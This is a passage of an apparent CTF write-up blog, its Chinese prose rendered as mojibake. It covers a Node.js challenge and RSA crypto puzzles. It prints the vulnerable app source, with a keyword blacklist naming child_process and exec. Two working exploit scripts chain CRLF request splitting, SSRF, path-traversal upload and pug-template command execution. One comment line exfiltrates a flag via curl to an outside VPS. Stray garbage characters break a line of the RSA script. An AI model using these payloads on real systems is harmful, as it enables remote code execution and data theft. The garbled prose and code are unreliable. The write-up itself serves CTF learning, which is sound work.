class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>åˆ†æä»£ç å¾—çŸ¥å‡ ä¸ªè·¯ç”±çš„ç”¨å¤„ï¼š</p>
<blockquote>
<p>1ã€ /ï¼šä¼šåŒ…å«/templateç›®å½•ä¸‹çš„ä¸€ä¸ªpugæ¨¡æ¿æ–‡ä»¶æ¥ç”¨pubè¿›è¡Œæ¸²æŸ“ï¼›</p>
<p>2ã€/sourceï¼šå›æ˜¾æºç ï¼›</p>
<p>3ã€/file_uploadï¼šé™åˆ¶äº†åªèƒ½ç”±IPä¸º<code>127.0.0.1</code>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶MIMEè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ï¼›</p>
<p>4ã€/coreï¼šé€šè¿‡<code>q</code>å‘å†…ç½‘çš„8081ç«¯å£ä¼ å‚ï¼Œç„¶åè·å–æ•°æ®å†è¿”å›å¤–ç½‘ï¼Œå¹¶ä¸”å¯¹urlè¿›è¡Œé»‘åå•çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œçš„é»‘åå•å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p>
</blockquote>
<p>ä½†æ˜¯<code>/core</code>è·¯ç”±ä¸‹ä¸èƒ½ç›´æ¥SSRFï¼Œè€Œæ˜¯éœ€è¦åˆ©ç”¨<code>Node js</code>çš„ç¼–ç å®‰å…¨é—®é¢˜ï¼ˆå‚è€ƒ<a href="https://xz.aliyun.com/t/2894">è¿™é‡Œ</a>ï¼‰ï¼Œå¯¹ç¼–ç ç²¾å¿ƒæ„é€ è¿›è¡Œ<code>CRLFæ³¨å…¥</code>ä»è€Œæ¥è¿›è¡ŒSSRFï¼Œé‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ˜ç¡®äº†ï¼š</p>
<ul>
<li>1ã€åˆ©ç”¨CRLFæ³¨å…¥è¿›è¡ŒSSRF</li>
<li>2ã€åˆ©ç”¨SSRFä¼ªé€ æœ¬åœ°IPè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </li>
<li>3ã€ä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œä»£ç çš„pugæ–‡ä»¶åˆ°<code>/template</code>ç›®å½•</li>
<li>4ã€åˆ©ç”¨<code>action</code>å‚æ•°åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤</li>
</ul>
<h3 id="è§£é¢˜-7"><a href="#è§£é¢˜-7" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å‚è€ƒä¸Šé¢æ–‡ç« å¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸º<code>\u010D\u010A</code>æ¥æ›¿æ¢æ¢è¡Œ<code>\r\nï¼ˆ%0D%0Aï¼‰</code>ï¼Œå…¶ä»–çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¹Ÿå¦‚æ­¤æ„é€ ï¼Œå¦‚<code>ç©ºæ ¼(%20)</code>æ„é€ ç¼–ç ä¸º<code>\u0120</code>ï¼Œ<code>+(%2B)</code>æ„é€ ç¼–ç æ„é€ ä¸º<code>\u012B</code>â€¦</p>
<p>æ ¹æ®è¿™ä¸ªæ–¹å¼ï¼Œæ„é€ æ‹†åˆ†è¯·æ±‚ä»è€Œè¿›è¡ŒSSRFï¼Œå‚è€ƒç½‘ä¸Šå¸ˆå‚…çš„expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""" HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="ggb0n.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(<span class="string">'+'</span>, <span class="string">'\u012b'</span>)             \</span><br><span class="line">    .replace(<span class="string">' '</span>, <span class="string">'\u0120'</span>)             \</span><br><span class="line">    .replace(<span class="string">'\r\n'</span>, <span class="string">'\u010d\u010a'</span>)    \</span><br><span class="line">    .replace(<span class="string">'"'</span>, <span class="string">'\u0122'</span>)             \</span><br><span class="line">    .replace(<span class="string">"'"</span>, <span class="string">'\u0a27'</span>)             \</span><br><span class="line">    .replace(<span class="string">'['</span>, <span class="string">'\u015b'</span>)             \</span><br><span class="line">    .replace(<span class="string">']'</span>, <span class="string">'\u015d'</span>) \</span><br><span class="line">    + <span class="string">'GET'</span> + <span class="string">'\u0120'</span> + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q='</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n'</span>).text)</span><br></pre></td></tr></table></figure>

<p>å‡ºé¢˜å¸ˆå‚…çš„expå…·æœ‰æ›´é«˜çš„çµæ´»æ€§ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl vps-ip:port -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure>

<p>åŒå¿—ä»éœ€åŠªåŠ›å•Šï¼</p>
<p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a><br><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#è‡ªå·±å‡ºçš„-node-game">https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a></p>
<h2 id="Crypto-Easy-RSA"><a href="#Crypto-Easy-RSA" class="headerlink" title="Crypto-Easy_RSA"></a>Crypto-Easy_RSA</h2><p>è€ƒå¯Ÿå…±æ¨¡æ”»å‡»</p>
<h3 id="è§£é¢˜-8"><a href="#è§£é¢˜-8" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç»™çš„é™„ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br></pre></td></tr></table></figure>

<p>è¿™å°±å¾ˆæ˜æ˜¾äº†ï¼Œå¯¹ç›¸åŒçš„æ˜æ–‡ï¼Œåˆ©ç”¨ç›¸åŒçš„æ¨¡æ•°<code>n</code>ï¼Œä¸åŒçš„<code>e</code>è¿›è¡ŒåŠ å¯†ï¼Œæ˜¾ç„¶çš„å…±æ¨¡æ”»å‡»ã€‚<br>ç›´æ¥ä¸Šè„šæœ¬äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)ä¸ªå­—ç¬¦</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure>

<p>å…³äºRSAæ”»å‡»çš„ä¸€äº›å¸¸è§é¢˜ç›®ï¼Œå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/6459">è¿™é‡Œ</a>ã€‚</p>
<h2 id="Crypto-warm-up"><a href="#Crypto-warm-up" class="headerlink" title="Crypto-warm_up"></a>Crypto-warm_up</h2><p>ä¸€é“RSAæ”»å‡»é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™ç”¨äº†å¾ˆä¹…çš„æ—¶é—´ï¼Œç»“æœæ–¹æ³•æ˜¯é‚£ä¸ªæ–¹æ³•ï¼Œä¹Ÿæ²¡æ¯›ç—…ï¼Œä½†æ˜¯æ‹¿åˆ°çš„ä¸­é—´è§£å¯†ç»“æœå°±æ˜¯è·Ÿæ­£ç¡®çš„ä¸ä¸€æ ·â€¦<br>ã€è¡¥å……ã€‘åæ¥å¾—çŸ¥æ˜¯åˆ©ç”¨<a href="https://blog.csdn.net/jcbx_/article/details/101066670">Rabinç®—æ³•</a>æ¥è§£å¯†ï¼Œ</p>
<h3 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆæ‹¿åˆ°åŠ å¯†çš„è„šæœ¬ï¼š<br><code>challenge</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encode <span class="keyword">import</span> KEY</span><br><span class="line"></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s=getPrime(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line">n1=p*q</span><br><span class="line"><span class="comment"># p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599</span></span><br><span class="line"><span class="comment"># q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279</span></span><br><span class="line">n2=p*r</span><br><span class="line"><span class="comment"># r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829</span></span><br><span class="line">n3=p*q*s</span><br><span class="line"><span class="comment"># s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546</span></span><br><span class="line">c1=pow(s,e1,n1)</span><br><span class="line">Key=int(KEY.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">key_encode=pow(Key,e2,n3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc"</span>,<span class="string">"a"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"c1: "</span>+str(c1)+<span class="string">"\n"</span>)</span><br><span class="line">    